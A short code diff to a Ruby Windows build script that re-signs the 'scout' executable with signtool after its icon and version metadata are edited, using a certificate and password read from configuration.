@@ -387,6 +387,9 @@ class BuildWindows < Build
     CrossPlatform.exec path('rcedit'), "/I #{path('scout')} #{path(icon)}"
 
     CrossPlatform.exec path('verpatch'), "/fn /va #{path('scout')} \"#{info[:version]}\" /s pb \"\" /s desc \"#{info[:desc]}\" /s company \"#{info[:company]}\" /s (c) \"#{info[:copyright]}\" /s product \"#{info[:desc]}\" /pv \"#{info[:version]}\""
+    
+    # sign it again
+    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('scout')}" if to_be_signed?(params)
   end
 end
 
